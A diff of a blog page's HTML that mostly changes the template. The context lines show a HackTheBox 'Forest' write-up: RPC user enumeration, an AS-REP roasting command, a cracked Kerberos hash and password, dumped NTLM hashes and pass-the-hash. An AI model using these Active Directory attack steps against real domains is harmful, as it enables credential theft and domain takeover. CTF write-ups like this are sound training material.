@@ -9,7 +9,6 @@
 <html lang="en-US" class="no-js">
   <head>
     <meta charset="utf-8">
-
 <!-- begin _includes/seo.html --><title>HackTheBox Forest - Dcodezero</title>
 <meta name="description" content="It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.">
 
@@ -64,21 +63,42 @@
 <!-- end _includes/seo.html -->
 
 
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
 
-  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
 <script>
-  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
-  window.enable_copy_code_button = true;
-</script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
 
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
 <!-- For all browsers -->
 <link rel="stylesheet" href="/assets/css/main.css">
 <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
-
-
 
     <!-- start custom head snippets -->
 
@@ -276,7 +296,7 @@
 
   
     <div class="author__avatar">
-      <a href="http://localhost:4000/">
+      <a href="/">
         <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
       </a>
     </div>
@@ -284,7 +304,7 @@
 
   <div class="author__content">
     <h3 class="author__name p-name" itemprop="name">
-      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">DcodeZer0</a>
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
     </h3>
     
       <div class="author__bio p-note" itemprop="description">
@@ -307,13 +327,15 @@
       
         
           
-        
-          
             <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
           
         
           
             <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
           
         
       
@@ -515,7 +537,7 @@ Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
 
 <h2 id="finding-users-in-the-domain">Finding Users in the domain</h2>
 
-<p>I used <code>RPCCLIENT</code> to find the users in the domain</p>
+<p>I used <code class="language-plaintext highlighter-rouge">RPCCLIENT</code> to find the users in the domain</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#rpcclient 10.10.10.161 -U%
 rpcclient $&gt; enumdom
@@ -555,13 +577,13 @@ user:[santi] rid:[0x480]
 </code></pre></div></div>
 
 <h2 id="getting-tgt">Getting TGT</h2>
-<p>Getting the <code>TGT</code> from the list of users found from <code>RPCCLIENT</code> using <code>IMPACKET SCRIPTS</code>.</p>
+<p>Getting the <code class="language-plaintext highlighter-rouge">TGT</code> from the list of users found from <code class="language-plaintext highlighter-rouge">RPCCLIENT</code> using <code class="language-plaintext highlighter-rouge">IMPACKET SCRIPTS</code>.</p>
 
 <blockquote>
   <p>python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco</p>
 </blockquote>
 
-<p>There are a bunch of ways to use <code>impacket-scripts</code>, so we can use the below options as well.</p>
+<p>There are a bunch of ways to use <code class="language-plaintext highlighter-rouge">impacket-scripts</code>, so we can use the below options as well.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Options:
 
@@ -572,7 +594,7 @@ htb.local - is the domain name we extracted from the nmap output
 -dc-ip - the domain controller IP address
 </code></pre></div></div>
 
-<p>we get the hash of the user <code>SVC-alfresco</code></p>
+<p>we get the hash of the user <code class="language-plaintext highlighter-rouge">SVC-alfresco</code></p>
 
 <blockquote>
   <p>$krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb</p>
@@ -587,10 +609,10 @@ htb.local - is the domain name we extracted from the nmap output
 </blockquote>
 
 <blockquote>
-  <p>$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:<code>s3rvice</code></p>
+  <p>$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:<code class="language-plaintext highlighter-rouge">s3rvice</code></p>
 </blockquote>
 
-<p>As the password is found, I proceed with using <code>Evil-Winrm</code> to gain the foothold of the machine</p>
+<p>As the password is found, I proceed with using <code class="language-plaintext highlighter-rouge">Evil-Winrm</code> to gain the foothold of the machine</p>
 
 <h2 id="getting-usertxt">Getting User.txt</h2>
 
@@ -607,11 +629,11 @@ Info: Establishing connection to remote endpoint
 
 <h3 id="from-svc-alfresco-to-administrator">From svc-alfresco to Administrator</h3>
 
-<p>Using <code>bloodhound</code> to find some intresting stuff</p>
+<p>Using <code class="language-plaintext highlighter-rouge">bloodhound</code> to find some intresting stuff</p>
 
 <p><img src="/assets/img/sample/forest1.png" alt="" /></p>
 
-<p>BloodHound Result Shows Svc-Alfresco can <code>WriteDacl</code> to HTB.local that Contains <code>administrator@htb.local.</code></p>
+<p>BloodHound Result Shows Svc-Alfresco can <code class="language-plaintext highlighter-rouge">WriteDacl</code> to HTB.local that Contains <code class="language-plaintext highlighter-rouge">administrator@htb.local.</code></p>
 
 <h3 id="useful-link-for-priv-esc">Useful link for priv esc</h3>
 
@@ -641,7 +663,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </code></pre></div></div>
 
-<p>So as we found the hash of the Administrator of the domain, we can now use <code>Pass the hash</code> to gain the Shell of Administrator.</p>
+<p>So as we found the hash of the Administrator of the domain, we can now use <code class="language-plaintext highlighter-rouge">Pass the hash</code> to gain the Shell of Administrator.</p>
 
 <h2 id="getting-roottxt">Getting Root.txt</h2>
 
@@ -764,7 +786,58 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/goad/GOAD-p1/" rel="permalink">Game of Active Directory - Part 1
+        <a href="/goad/GOAD-p2/" rel="permalink">Game of Active Directory - Part 2 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-02T00:00:00+05:30">December 2, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          16 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/GOAD.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p1/" rel="permalink">Game of Active Directory - Part 1 - [Basic]
 </a>
       
     </h2>
@@ -810,12 +883,12 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
   <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
     
       <div class="archive__item-teaser">
-        <img src="/assets/images/sample/homelab/Homelab.jpg" alt="">
+        <img src="/assets/images/sample/GOAD/mindmap.jpg" alt="">
       </div>
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/it/Homelad/" rel="permalink">HomeLab Part-01
+        <a href="/goad/mindmap/" rel="permalink">Mind Map for Active Directory - Pentesting
 </a>
       
     </h2>
@@ -827,7 +900,58 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
       <span class="page__meta-date">
         <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
         
-        <time datetime="2024-11-15T00:00:00+05:30">November 15, 2024</time>
+        <time datetime="2024-11-13T00:00:00+05:30">November 13, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/Homelab.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/it/Homelab/" rel="permalink">HomeLab Part-01 [The Server]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-11-07T00:00:00+05:30">November 7, 2024</time>
       </span>
     
 
@@ -848,110 +972,6 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
 
     <p class="archive__item-excerpt" itemprop="description">This the where you’ll see the hardware infrastructure of my home lab
-</p>
-  </article>
-</div>
-
-    
-      
-      
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-      <div class="archive__item-teaser">
-        <img src="/assets/images/sample/spoof-check/spoofing.jpg" alt="">
-      </div>
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/tools/spoofcheck/" rel="permalink">SpoofCheck.py
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-      
-      <span class="page__meta-date">
-        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
-        
-        <time datetime="2024-11-03T00:00:00+05:30">November 3, 2024</time>
-      </span>
-    
-
-    <span class="page__meta-sep"></span>
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
-        
-          4 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">This tool checks if domain spoofing is possible or not.
-</p>
-  </article>
-</div>
-
-    
-      
-      
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-      <div class="archive__item-teaser">
-        <img src="/assets/images/sample/html-obfs/html-obfs.jpg" alt="">
-      </div>
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/tools/HTML-Obfuscator/" rel="permalink">HTML-Obfuscator
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-      
-      <span class="page__meta-date">
-        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
-        
-        <time datetime="2024-10-02T00:00:00+05:30">October 2, 2024</time>
-      </span>
-    
-
-    <span class="page__meta-sep"></span>
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
-        
-          5 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.
 </p>
   </article>
 </div>
